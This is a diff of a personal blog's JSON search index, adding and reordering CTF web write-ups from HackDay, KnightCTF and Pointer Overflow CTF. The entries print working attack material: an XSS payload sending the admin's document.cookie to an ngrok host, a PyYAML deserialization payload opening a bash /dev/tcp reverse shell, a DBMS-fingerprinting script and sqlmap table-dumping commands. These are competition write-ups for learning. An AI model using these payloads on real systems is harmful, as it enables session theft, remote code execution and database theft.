@@ -1,8 +1,25 @@
 [
   
   {
+    "title": "HackDay - Intenal Blog",
+    "url": "/posts/hackday-2025-internalblog/",
+    "categories": "Writeups, CTFTime2025, HackDay",
+    "tags": "writeups, web, flask, yaml-injection, unsecure-deserialization, rce",
+    "date": "2025-01-26 12:00:00 +0000",
+    
+
+
+
+
+
+    
+    "snippet": "  Introduction          Description        Enumeration          Enumerating website        Exploitation          Popping alert      Stealing Admin Cookie      Getting flag      IntroductionDescript...",
+    "content": "  Introduction          Description        Enumeration          Enumerating website        Exploitation          Popping alert      Stealing Admin Cookie      Getting flag      IntroductionDescription  You’ve received an anonymous tip from the Airship Mail Delivery Company claiming that a seemingly legitimate website is actually a front for trading stolen submarine mechanical parts. Yeah, that’s oddly specific…The localhost port is 3000. Take a closer look and see if you can uncover anything suspicious. The flag to find is the bot’s cookie.EnumerationEnumerating websiteLet’s start by accessing the index page:Admin visits every postsA part of the source is leakedWe can see an interesting code snippet in here:await newProfile.save();const isXSSdetected = sanitizeJson(profileData, res);User is saved BEFORE XSS sanitization. So the server will yield at us, but will still create the user. And we know that admin verifies every post ! Let’s exploit this to steal the admin cookie …ExploitationPopping alertSignup pageI started by writing a simple script that put an XSS payload in every single field of the signup form:from requests import Sessionfrom sys import argvURL = \"http://challenges.hackday.fr:61394\"PAYLOAD = f\"\"\"&lt;script&gt;alert(999)&lt;/script&gt;\"\"\"TOKEN = \"\"s = Session()def main():    # This token will by our \"UUID\", we get it from the page     TOKEN = s.get(URL+\"/profile\").text.split('&lt;p id=\"token-value\"&gt;')[1].split(\"&lt;/p&gt;\")[0]    print(s.post(URL+\"/profile\", {        \"id\": 'my_super_secret_username',        \"token\": TOKEN,        \"description\":f'{PAYLOAD}',        \"username\":\tf'{PAYLOAD}',        \"name\":\tf'{PAYLOAD}',        \"place\": f'{PAYLOAD}',    }).text)    print(\"Token is: \" + TOKEN)if __name__ == \"__main__\":    main()Launch the registration scriptThe server responds with “XSS Detected”, but the user was created ! Let’s try to access the profile page using the “UUID”:  http://challenges.hackday.fr:61394/user?token=aebcffcb-fcaf-4028-a409-4e9b4d13ab8fXSS !!!Stealing admin cookieTo steal the admin cookie, we have to:  Create a user with a malicious XSS payload  Create a post as this userAdmin will look at the newly created post, triggering the XSS and leaking his cookie.I’ll use my own tool, xsserve, to spawn a publicly accessible HTTP server.Next we have to modify the PAYLOAD =  line in the previous script, and put a more agressive XSS payload:# Simple XSS payload, I just use ` instead of \" or ' cause quotes are escapedPAYLOAD = f\"\"\"&lt;script&gt;window.location.href = `http://2.tcp.eu.ngrok:12812/?cookie=` + document.cookie&lt;/script&gt;\"\"\"Launch XSServe, create the user with malicious XSS payloadFinally, we create a post as this user:Creating a post as the db62c92f… userWe can see our post below on the index page:Getting flagAfter a few minutes:HACKDAY{0rd3R_M4tteRs_In_Ur_C0d3!!!!}"
+  },
+  
+  {
     "title": "KnightCTF - Luana",
-    "url": "/posts/KnightCTF2025_lua/",
+    "url": "/posts/knightctf-2025-luana/",
     "categories": "Writeups, CTFTime2025, Knightctf",
     "tags": "writeups, web, redis, sandbox-escape, CVE-2022-0543",
     "date": "2025-01-20 16:00:00 +0000",
@@ -19,7 +36,7 @@
   
   {
     "title": "KnightCTF - Baby Injection",
-    "url": "/posts/KnightCTF2025-baby_injection/",
+    "url": "/posts/knightctf-2025-baby-injection/",
     "categories": "Writeups, CTFTime2025, Knightctf",
     "tags": "writeups, web, flask, yaml-injection, unsecure-deserialization, rce",
     "date": "2025-01-20 16:00:00 +0000",
@@ -32,6 +49,23 @@
     
     "snippet": "  Introduction          KnightCTF        Enumeration          Enumerating website        Exploitation          Getting RCE      Getting flag      IntroductionKnightCTFKnightCTF 2025 is an online je...",
     "content": "  Introduction          KnightCTF        Enumeration          Enumerating website        Exploitation          Getting RCE      Getting flag      IntroductionKnightCTFKnightCTF 2025 is an online jeopardy style Capture the Flag (CTF) competition hosted by the Knight Squad community from Bangladesh. This is the first international CTF from Bangladesh.   Link to the event We’ve finished 117 on 759.EnumerationEnumerating websiteLet’s start by accessing the index page:Website index pageWe got redirected to / with a strange base64 payload, let’s decode this:Ok so the server renders YAML probably by decoding the base64, load it, then write it on the page.We can search if there is vulnerabilities in here, I’ll search for keywords like yaml injection python:We got a hit !You can read the article here. For this CTF, we’re only interested by this part:ExploitationGetting RCELet’s adapt this payload to get RCE. I’ll simply replace the time.sleep [params] by os.system [params], and put a bash reverse shell like this:yaml: !!python/object/apply:os.system [\"bash -c 'bash -i &gt;&amp; /dev/tcp/5.tcp.eu.ngrok.io/14824 0&gt;&amp;1'\"]And encode it with base64:eWFtbDogISFweXRob24vb2JqZWN0L2FwcGx5Om9zLnN5c3RlbSBbImJhc2ggLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvNS50Y3AuZXUubmdyb2suaW8vMTQ4MjQgMD4mMSciXQ==We set up a netcat + ngrok listener:Then I try to access http://TARGET_IP/{base64_payload}:Getting FlagKCTF{d38787fb0741bd0efdad8ed01f037740}"
+  },
+  
+  {
+    "title": "Pointer Overflow CTF",
+    "url": "/posts/poctf-2025/",
+    "categories": "Writeups, CTFTime2025, PoCTF",
+    "tags": "writeups, web, sql-injection, sqlmap",
+    "date": "2025-01-18 16:00:00 +0000",
+    
+
+
+
+
+
+    
+    "snippet": "  Introduction          Pointer Overflow CTF        Enumeration          Index page      Search page      Identifying DBMS        Exploitation          SQLmap                  Identifying SQLi type...",
+    "content": "  Introduction          Pointer Overflow CTF        Enumeration          Index page      Search page      Identifying DBMS        Exploitation          SQLmap                  Identifying SQLi type          Leaking tables          Leaking columns          Dumping tables                    IntroductionPointer Overflow CTFThe University of Wisconsin - Stevens Point and the Department of Computing and New Media Technologies happily welcomes you to the Pointer Overflow CTF. This contest is a challenge of ingenuity and skill brought to you in honor of our incredible students and alumni.   Link to the event We managed to finish 132 on 2509 with my team (fish3r).EnumerationIndex PageAs you can see, the index page is static (so uninteresting). Let’s move on !Search pageOh, an inputThis payload will test for SSTI, SQLi and XSS. Let’s send it to the server and see how it goes:PayloadThe server crashesThe SSTI would have simply returned 49, and the XSS would have just printed out a title (a). The only payload that causes the server to crash is the SQLi one.Let’s confirm:We have an SQL injection !Identifying DBMSSince I’m lazy, I tried using SQLmap directly, but unfortunately it didn’t work. To make it work, we need to optimize the syntax that we’ll use. We need:  the DBMS  the SQLi METHOD (error based, time based…)  the POST request file for SQLmapTo identify the DBMS I used payloads from PayloadsAllTheThings and analyzed the server responses. In our case, a 500 response indicates that the payload didn’t work, meaning the server wasn’t using the associated DBMS.I’m still lazy, so I wrote a python script to automate the identification process:#!/usr/bin/env python3from requests import postfrom pwn import log# URL of the challengeurl = \"http://34.135.223.176:1928/search\"# Use payloads from payload all the thingspayloads = {    \"mysql\": \"connection_id()=connection_id()\",    \"mssql\": \"BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)\",    \"oracle:\": \"ROWNUM=ROWNUM\",    \"pgsql\": \"pg_client_encoding()=pg_client_encoding()\",    \"sqlite\": \"sqlite_version()=sqlite_version()\",    \"msaccess\": \"val(cvar(1))=1\",}# Loop through every payloadfor key in payloads:    log.info(f\"Sending payload for {key} ...\")    st = post(url, data={        \"query\": f\"' OR {payloads[key]} OR '\"    }).status_code    if(st == 500):        log.failure(\"Got 500\")    else:        log.info(f\"Got {st} !!!\")        log.success(f\"Backend is {key}\")        exit()The backend is using SQLite !ExploitationSQLmapIdentifying SQLi TypeAs we’ve seen earlier, the server returns a 500 when we put a '. This means the server doesn’t show database errors, so no error based SQLi. We can try boolean based and time based.First, we need to create the post request file for SQLmap:Now we can launch the attack with this file:sqlmap -r req --dbms=sqlite --level 5 --risk 3 --technique BTLeaking tablessqlmap -r req --dbms=sqlite --level 5 --risk 3 --technique B --tablesThere’s one table named recipesLeaking columnsSince it’s boolean time based SQLi, dumping the full table will take a long time. To optimize, we’ll extract only the column that we are interested in.sqlmap -r req --dbms=sqlite --level 5 --risk 3 --technique B -T recipes --columnsSeveral columns found.Dumping tableFinally, we can dump the flag columns from recipes table:sqlmap -r req --dbms=sqlite --level 5 --risk 3 --technique B -T recipes -C flag --dumpGot it !poctf{uwsp_7h3_5leep3r_mu57_4w4k3n}"
   },
   
   {
@@ -52,25 +86,8 @@
   },
   
   {
-    "title": "Pointer Overflow CTF",
-    "url": "/posts/PoCTF2025/",
-    "categories": "Writeups, CTFTime2025, PoCTF",
-    "tags": "writeups, web, sql-injection, sqlmap",
-    "date": "2025-01-18 16:00:00 +0000",
-    
-
-
-
-
-
-    
-    "snippet": "  Introduction          Pointer Overflow CTF        Enumeration          Index page      Search page      Identifying DBMS        Exploitation          SQLmap                  Identifying SQLi type...",
-    "content": "  Introduction          Pointer Overflow CTF        Enumeration          Index page      Search page      Identifying DBMS        Exploitation          SQLmap                  Identifying SQLi type          Leaking tables          Leaking columns          Dumping tables                    IntroductionPointer Overflow CTFThe University of Wisconsin - Stevens Point and the Department of Computing and New Media Technologies happily welcomes you to the Pointer Overflow CTF. This contest is a challenge of ingenuity and skill brought to you in honor of our incredible students and alumni.   Link to the event We managed to finish 132 on 2509 with my team (fish3r).EnumerationIndex PageAs you can see, the index page is static (so uninteresting). Let’s move on !Search pageOh, an inputThis payload will test for SSTI, SQLi and XSS. Let’s send it to the server and see how it goes:PayloadThe server crashesThe SSTI would have simply returned 49, and the XSS would have just printed out a title (a). The only payload that causes the server to crash is the SQLi one.Let’s confirm:We have an SQL injection !Identifying DBMSSince I’m lazy, I tried using SQLmap directly, but unfortunately it didn’t work. To make it work, we need to optimize the syntax that we’ll use. We need:  the DBMS  the SQLi METHOD (error based, time based…)  the POST request file for SQLmapTo identify the DBMS I used payloads from PayloadsAllTheThings and analyzed the server responses. In our case, a 500 response indicates that the payload didn’t work, meaning the server wasn’t using the associated DBMS.I’m still lazy, so I wrote a python script to automate the identification process:#!/usr/bin/env python3from requests import postfrom pwn import log# URL of the challengeurl = \"http://34.135.223.176:1928/search\"# Use payloads from payload all the thingspayloads = {    \"mysql\": \"connection_id()=connection_id()\",    \"mssql\": \"BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)\",    \"oracle:\": \"ROWNUM=ROWNUM\",    \"pgsql\": \"pg_client_encoding()=pg_client_encoding()\",    \"sqlite\": \"sqlite_version()=sqlite_version()\",    \"msaccess\": \"val(cvar(1))=1\",}# Loop through every payloadfor key in payloads:    log.info(f\"Sending payload for {key} ...\")    st = post(url, data={        \"query\": f\"' OR {payloads[key]} OR '\"    }).status_code    if(st == 500):        log.failure(\"Got 500\")    else:        log.info(f\"Got {st} !!!\")        log.success(f\"Backend is {key}\")        exit()The backend is using SQLite !ExploitationSQLmapIdentifying SQLi TypeAs we’ve seen earlier, the server returns a 500 when we put a '. This means the server doesn’t show database errors, so no error based SQLi. We can try boolean based and time based.First, we need to create the post request file for SQLmap:Now we can launch the attack with this file:sqlmap -r req --dbms=sqlite --level 5 --risk 3 --technique BTLeaking tablessqlmap -r req --dbms=sqlite --level 5 --risk 3 --technique B --tablesThere’s one table named recipesLeaking columnsSince it’s boolean time based SQLi, dumping the full table will take a long time. To optimize, we’ll extract only the column that we are interested in.sqlmap -r req --dbms=sqlite --level 5 --risk 3 --technique B -T recipes --columnsSeveral columns found.Dumping tableFinally, we can dump the flag columns from recipes table:sqlmap -r req --dbms=sqlite --level 5 --risk 3 --technique B -T recipes -C flag --dumpGot it !poctf{uwsp_7h3_5leep3r_mu57_4w4k3n}"
-  },
-  
-  {
     "title": "UofTCTF - Prismatic Blogs",
-    "url": "/posts/UofTCTF2025-prismatic-copy/",
+    "url": "/posts/uoftctf2025-prismatic/",
     "categories": "Writeups, CTFTime2025, UofTCTF2025",
     "tags": "writeups, web, express, json-injection, orm-injection, prisma, python",
     "date": "2025-01-11 16:00:00 +0000",
